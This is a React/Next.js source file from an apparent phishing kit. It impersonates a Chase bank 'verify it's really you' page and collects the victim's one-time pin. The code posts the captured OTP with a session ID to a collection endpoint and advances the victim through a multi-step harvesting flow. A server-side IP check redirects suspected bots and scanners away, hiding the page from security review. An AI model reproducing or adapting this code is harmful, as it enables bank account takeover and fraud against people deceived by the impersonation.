import { Box, Typography } from "@mui/material";
import axios from "axios";
import { GetServerSideProps } from "next";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Content } from "../components/Content";
import { CustomButton } from "../components/CustomButton";
import { CustomInput } from "../components/CustomInput";
import { SubTitle } from "../components/SubTitle";
import { Title } from "../components/Title";
import { Wrapper } from "../components/Wrapper";
import checkIp from "../middleware/checkIp";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";

interface OtpProps {}

export const Otp: React.FC<OtpProps> = () => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    mode: `onTouched`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `ONE TIME PIN`);
    formData.append(
      `otp`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-otp`, formData);
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      otp: data,
    });

    const url = getProgress()[getProgress().indexOf(`OTP`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper current="OTP">
      <Box width="100%" padding="1rem">
        <Head>
          <title>Identification - chase.com</title>
        </Head>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            paddingX: "2rem",
          }}
        >
          <Typography
            component="h2"
            sx={{
              marginTop: "10px",
              color: "#666",
              fontWeight: 300,
              fontSize: "1.5rem",
            }}
          >
            {`Let's`} verify {`it's`} really you.
          </Typography>
          <Typography
            component="h3"
            sx={{
              marginTop: "8px",
              fontSize: ".8125rem",
              fontWeight: 300,
              color: "#414042",
            }}
          >
            To protect your account, please enter the one time pin we have sent
            you on your primary number, please not it might take up to 5 minutes
            to receive the code.
          </Typography>
        </Box>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            padding: "2rem",
          }}
        >
          <Title title="One Time Pin" />
          <SubTitle subTitle="We have sent you a one time pin on your primary number" />
          <Content>
            <Box flex={1} width={["100%", "initial"]}>
              <CustomInput
                label="One Time Pin"
                name="otp"
                errors={errors}
                type="number"
                register={register("otp", {
                  validate: (value) => {
                    if (value.length === 6 || value.length === 8) {
                      return true;
                    }

                    return `Please enter a valid one time pin`;
                  },
                  required:
                    "One Time Pin must be entered. Please the one time pin we sent you.",
                })}
              />
            </Box>
            <Box width="10px" display={["none", "block"]} />
          </Content>
          <Box
            width="100%"
            sx={{
              display: "flex",
              justifyContent: "flex-end",
              marginTop: "1.5rem",
            }}
          >
            <Box width={["100%", "30%"]}>
              <CustomButton text="Next" onClick={onSubmit} disabled={loading} />
            </Box>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default Otp;
